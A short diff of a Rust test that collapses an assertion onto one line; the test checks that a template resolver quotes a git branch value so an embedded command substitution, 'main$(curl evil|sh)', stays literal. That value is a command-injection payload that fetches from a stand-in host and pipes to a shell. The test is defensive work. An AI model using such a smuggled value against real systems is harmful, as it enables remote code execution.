@@ -92,10 +92,7 @@ fn resolve_template_shell_blocks_command_substitution_injection() {
     // The whole branch value lives inside one single-quoted span, so `sh -c`
     // sees it as a literal argument to `git fetch`, never as a command
     // substitution.
-    assert_eq!(
-        resolved,
-        "git fetch origin 'main$(curl evil|sh)'"
-    );
+    assert_eq!(resolved, "git fetch origin 'main$(curl evil|sh)'");
 }
 
 #[test]
